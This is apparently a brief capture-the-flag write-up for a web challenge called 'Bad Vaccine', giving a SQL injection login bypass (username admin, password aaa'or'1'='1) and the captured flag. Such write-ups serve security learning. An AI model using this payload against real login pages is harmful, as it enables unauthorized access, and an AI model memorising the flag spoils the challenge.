# Bad Vaccine

Find out what are the bad vaccines and destroy them.

http://vaccine.nypinfsecctf.tk/

## Solution

1. When presented with a login page, I always try a SQL Injection first. To perform the SQL Injection, input the following details into their respective fields.
```
Username: admin
Password: aaa'or'1'='1
```
```
Flag: NYP{3z_sQL_iNJ3cTi0n}
```
